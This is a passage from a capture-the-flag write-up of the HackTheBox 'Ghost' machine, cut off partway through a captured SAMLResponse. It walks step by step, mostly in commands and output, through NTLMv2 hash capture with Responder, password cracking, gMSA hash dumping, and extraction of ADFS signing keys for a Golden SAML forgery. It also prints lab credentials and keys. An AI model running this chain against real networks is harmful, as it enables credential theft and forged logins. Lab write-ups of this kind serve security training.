GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.2582
Host: bitbucket.ghost.htb
Connection: Keep-Alive
```

Setting the DNS entry for `bitbucket.ghost.htb` to my IP seems to work and the DNS server returns my IP address now. Shortly after I receive a request to my HTTP listener, without useful information though. It just confirms that there is _someone_ on the other side trying to access **bitbucket**.\
I set up `Responder` to listen on multiple ports for traffic and promptly receive another connection via **HTTP**. Thanks to `Responder` a NTLMv2 hash is extracted and displayed to me.

```python
sudo responder -I tun0
--- SNIP ---
[HTTP] NTLMv2 Client   : 10.129.231.73
[HTTP] NTLMv2 Username : ghost\justin.bradley 
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:b7619e9e42b252c7:60A0665193C6DEA64196D07956ECB163:0101000000000000F3A424D65DD8DA01C03BFFB4EAD9920C0000000002000800430037003500440001001E00570049004E002D005400350049004C00550033005400320056004A0046000400140043003700350044002E004C004F00430041004C0003003400570049004E002D005400350049004C00550033005400320056004A0046002E0043003700350044002E004C004F00430041004C000500140043003700350044002E004C004F00430041004C0008003000300000000000000000000000004000009C6DDFD6C116FE4140FA8D682329A108659AFBF67B8B24E7C50B4DEB3EE372460A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
```

The hash cracks with `/usr/share/wordlist/rockyou.txt` and reveals the password `Qwertyuiop1234$$`.

```python
john --fork=10 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwertyuiop1234$$ (justin.bradley)
--- SNIP ---// Some code
```

The user is part of the `Remote Management Group`, letting me use `evil-winrm` to access the **Domain Controller** and collect the first flag.

#### ADFS and GoldenSAML <a href="#adfs-and-goldensaml" id="adfs-and-goldensaml"></a>

As previously `justin.bradley` can read the password for the `ADFS_GMSA$` so I use **nxc** to dump the NTLM hash `4f4b81c5f6a9c1931310ece55a02a8d6`.

```python
nxc ldap dc01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa
SMB         10.129.231.73   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.231.73   636    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$
LDAPS       10.129.231.73   636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.231.73   636    DC01             Account: adfs_gmsa$           NTLM: 4f4b81c5f6a9c1931310ece55a02a8d6
```

The account `ADFS_GMSA$` is also in the `Remote Management Group` and I can login. In order to perform a [GoldenSAML](https://www.netwrix.com/golden_saml_attack.html) attack and forge valid **SAMLResponses**, I need to obtain a few information but that can easily be achieved with [ADFSDump](https://github.com/mandiant/ADFSDump). After compiling I upload the binary. Luckily it’s not detected by AV so no bypass is needed. Running it in the context of the service user dumps relevant information onto the console.

```python
.\ADFSDump.exe
    ___    ____  ___________ ____                      
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____ 
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/ 
                                              /_/      
Created by @doughsec
 
 
## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
 
 
[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
 
 
## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
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
[-] Encrypted Token Signing Key End
 
[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My
 
## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-] 
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>
 
 
    Access Policy Parameter: 
    
    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
```

From the output I can find several flags that [ADFSpoof](https://github.com/mandiant/ADFSpoof) expects, the `--endpoint` is `https://core.ghost.htb:8443/adfs/saml/postResponse`, the `--rpidentifier` seems to be `https://core.ghost.htb:8443` and `-b`, the encrypted PFX blob and decryption key. The blob is the large base64 part and the decryption key is directly above, but they need to be converted first.

```python
echo "<large base64 block>" | base64 -d > TKSKey.bin
 
echo "8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1" | \
     tr -d "-" | \
     xxd -r -p > DKMkey.bin
```

Now there are just three more _mandatory_ flags missing. The assertion that I want to sign / forge and some kind of nameidformat and its identifier. Those values are best extracted from a valid response. I perform another login on `https://core.ghost.htb:8443/login` and send the requests through **Burp**.

\
First I am redirected to `https://federation.ghost.htb/adfs/ls/?SAMLRequest=<REQUEST>&SigAlg=<SNIP>&Signature=<SNIP>` where I provide the credentials and then im being redirected to `https://core.ghost.htb/adfs/saml/postResponse` while providing the `SAMLResponse` as POST value.

```python
POST /adfs/saml/postResponse HTTP/1.1
Host: core.ghost.htb:8443
Cookie: connect.sid=s%3AMjAGnrEfnyuTXd-jCk0cnkdIKGHRHym-.xGJaUrXU3jdAsEzKQGE8tkJCfbfE8K6Y6qiC2gUx9dA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6753
Origin: https://federation.ghost.htb
Referer: https://federation.ghost.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Te: trailers
Connection: keep-alive
SAMLResponse=PHNhbWxwOlJlc3BvbnNlIElEPSJfYjZmNTg5YTctYjI3My00ZWRiLTgwMzEtODJhYTE5NGIxNTllIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNC0wNy0xN1QxNzoxMDo1Ny4wNjJaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIiBJblJlc3BvbnNlVG89Il82YzIzOGE5M2U3YjIyNWQ4YTU4ZTI2MTNjY2I4MWVhYjA2NWYyNWQ3IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIgLz48L3NhbWxwOlN0YXR1cz48QXNzZXJ0aW9uIElEPSJfZWI1MmNmNzMtOWRlOS00MjdjLTg3NWUtYzlhNDQyYTYwNGNhIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDctMTdUMTc6MTA6NTcuMDYyWiIgVmVyc2lvbj0iMi4wIiB4bWxucz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPElzc3Vlcj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIiAvPjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiAvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2ViNTJjZjczLTlkZTktNDI3Yy04NzVlLWM5YTQ0MmE2MDRjYSI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIiAvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIC8%2BPC9kczpUcmFuc2Zvcm1zPjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNzaGEyNTYiIC8%2BPGRzOkRpZ2VzdFZhbHVlPlFxTXdPeXZNSjY5RWV4SXI4d2dBUXNsaVFMY0NDSldJN3pEWlEvZGUybjA9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPkt5WmNiQk8zU3lTUGtlNS9jcmdHNGljYkRWRXFIb2czam9oT1docG03RnQwMzQrRDBMaUZpSjJmNmpISFFpS013RW1nMlBLanplVVoxQjBGcXpZNFhsSEN1ZGdWOWZ2TTZHK0pIeXZTNEhyU21YRjJYNmRieE5OOEcvcE82RUhIR29oOUtlbFljNUs0T0sxRmxJVzdTZjc5K1RJaGJFd3pCVFBpN015MGtsc3BaQXo3MC9KMktyZU5hQVV2N3VBMTNHdm5TSWFabGhESEZvd0EwRU02VkpsV3QreFFacUVPNHlRZWRNZ3o2R3lmMHV3V05IeGp6MGZwQkt0Y3RQOGtKbmdraWVLUkdMUGVIZVZYQStCNGl6VWp2TTZncE91bDZtV2Y3SEJTQlUvZEkzSnlZbHl3cyt1YjF4TjlweU9uRFB1b3JENGV2ZlhKRjVKMDAvcHBDK29naTFSSXpPSTRHMDRYL0RkWllHRUFXbmk3a2FZajhCWmNEY0Q2N0ZRenpnMTNzN1BWUSthT25XWitldEgzNm5mbVl2SFJmNVVXSXZ3NDdIQnF5UkZJYUc4VEtrMFp4SUxuQlJlUExRYy9BUHhNWWhWNE5PdGZXbHgvMHhQS3dVZEdWcFBCRG9mVjJsaGc0VmdFQlYybHQyeWMzdDRDb3pMaW8vRm1yOGRUS0RZUExvejVtQWUyM0xpMlZNQ1hrYVZHNVFNMEsrUGVrREYwTFBQRVIrNXlhK0RjNEpSWUhMNnBSMThYaHgxRE1IcXJkUklCQlAwaUJVYi84dXFYWXMvVm9FZFRtbU4rL1VCY1cvNWQ2K0FJVEx4R3FSUmZDSG8rNE0xK0VDZHJiZDZFSTBMMUhvMVNWWHFLSXovLzIralMrV3h1MktYQ05aeENXY29OdlhVPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPEtleUluZm8geG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUU1akNDQXM2Z0F3SUJBZ0lRSkZjV3dNeWJSYTVPNCtXTzV0V29HVEFOQmdrcWhraUc5dzBCQVFzRkFEQXVNU3d3S2dZRFZRUURFeU5CUkVaVElGTnBaMjVwYm1jZ0xTQm1aV1JsY21GMGFXOXVMbWRvYjNOMExtaDBZakFnRncweU5EQTJNVGd4TmpFM01UQmFHQTh5TVRBME1EVXpNREUyTVRjeE1Gb3dMakVzTUNvR0ExVUVBeE1qUVVSR1V5QlRhV2R1YVc1bklDMGdabVZrWlhKaGRHbHZiaTVuYUc5emRDNW9kR0l3Z2dJaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQ0R3QXdnZ0lLQW9JQ0FRQytBQU9JZkVxdGxZY24xNTNMMUJ2R1FnRHlYVG5Zd1RSenNLNTkrekUxemdHS085TjVuYjhGaytkYUtwV0xRYWlIN29ESGFlbncvUWF4Qmc1cWRlRFltRDNvejhLeWFBMXlnWUJyem00d1c3RmY4N3JLOUZlNUo1L2g2VzlnNzQ5aDVCSXFQUU9wMGw2czFyZnVtT2NjTjR5Ylc5NUVXTkwwdnVRWHZDK0tRNEQ0Z01YdThtQ0dweHR2SUw4aWxOdEp1SUczT1JZU0toUmFsMHl5SmVPaEc0eGdsclpKRjE4cDl3aG5FNm9tZ2dtQTZuMnNoRGsvdHZUWWppaTVlNy9pY1dUS2tyc01DcGFLVU5rN214ZE1aaFFhYjdTbWZLclpONHBSRDdkVmc1enpJeUQ3VXpTOUNITEM2eE56cS9aMGh1YU9hSmhPU2RKU2dhdC9ic0c4bmJ4MTlIRC8reXBXOUoyTHRORnVnZFd0bVVCV0RPUUJZVmhCOFNnNFZFR2dQOWp5SXRISDJienNEZmpSZEo4RTF1TkpXUC9rUUExK3dZbE9kZExxVTNiMElzQ3ZsQThFdllXMFQxUnN1NzdvNHgvdzBnV2Iwb1FQRUl6N3o5NzNiNDk2d3FRdDNEbnlmZU8zbFhYZlpOY3ZhajVLQ1AyVHRHQitLc2hGOXBrSVB4cTdGMmdNaDdRanhqUkhzQTI5VjhqRm85Z0xEN2tQVmljYUlVZHNnaUZIbllRRjE0YTUySnRSMVY1aU4raDk1Smt1dUVxUVdEQkhBdlBFQkJaa0VaSCs1eVQrYUNGWFhYK0JwUHQzUUdqWUxlSlU4Q0ZzTXRuOFFWTFl2TGRjVlJzVW5SaC9XSGlYd0pPT0VWRUNhOXc3L3lWbmhhbENOQngxRS9sNEtRSURBUUFCTUEwR0NTcUdTSWIzRFFFQkN3VUFBNElDQVFBV1lLWlczY0RDQk82ZFQzeWZsM09jdXlwMUxWS1ZJKzlwRngvYmJXcFdqU2RoNmIzOUxUeHhEN0ZZVXRodVdQWjNyRjRHK0ZkTUZISEN4M1lwRW1VRm5FTEtzWHFoWjk4OUFYNThJLzNtYmZVbEtXZUlQTFNMa3ArZVJab01Ka3Q3azEvS1h0RGFzT1FuME5zZ1lFb3dMQkltTUNNdTl1dWpuQ21GT3dIUC9JQmhnWVFNSGg0NkJ6U1hXUDNpOFZYYnJSdERwby9jLy9PRkpoR21ubkY4WlBtaTR4dHpmU0RCcFZLcXdWTHA3OENndU14alFkK2JkVWI0NTU4OFpKNENMc1BkUlFwMzBXSjEvQ05JYWVudkpXdEEyRzVJWnc1VTBFV0NKTG9ZSldGczlpeU9hMS95NTVydVc2SjhsSUdEMHdtb0VlQ2w5Q0gxRWQ0ZHpVZFVYZjFNQkNZUDNYOTJpYXh6VUUwdXBHZC8xUW82SFR5eU9sV3VBd3JrVDJWSEVMS1ZaS09nOCtkbHk5N2d5WklmVXRRd0lrUHdObDh2bzA0Y2ZqK2h6T3ZCelBLQUFZaDE0TkxndmVBSS9EcU1uTzBPS08rdzFIQkt3NjROQkNuOGdvYXpGK1B1RmZVTzB5TkhGTDRreE1wY2FwNmlldjZnM0JYQ1NEd2ZxVFVPRXVFczdxOW9ZS2dxMnFuTlZPVEloaEluTVhCekVtNmlQMTNqZnVPb1hKZFBBbkVVWG40eTV5d0E5N3J0YkduWkVQeXgxZjFFa1gvaGJxQlA0dm9ndjlrbHRhVUVFVlhrUytoUHB4Wm1leENOckJEMXE3R0ovNTBlYllsQzBDZXY4dzZNczh0TTBPcnZwcEdZbFdydFB3ZXZFdmZpUmt3QkxHN0VNQW5MU3c9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9LZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxTdWJqZWN0PjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI%2BPFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iXzZjMjM4YTkzZTdiMjI1ZDhhNThlMjYxM2NjYjgxZWFiMDY1ZjI1ZDciIE5vdE9uT3JBZnRlcj0iMjAyNC0wNy0xN1QxNzoxNTo1Ny4wNjJaIiBSZWNpcGllbnQ9Imh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0My9hZGZzL3NhbWwvcG9zdFJlc3BvbnNlIiAvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI0LTA3LTE3VDE3OjEwOjU3LjA2MloiIE5vdE9uT3JBZnRlcj0iMjAyNC0wNy0xN1QxODoxMDo1Ny4wNjJaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaH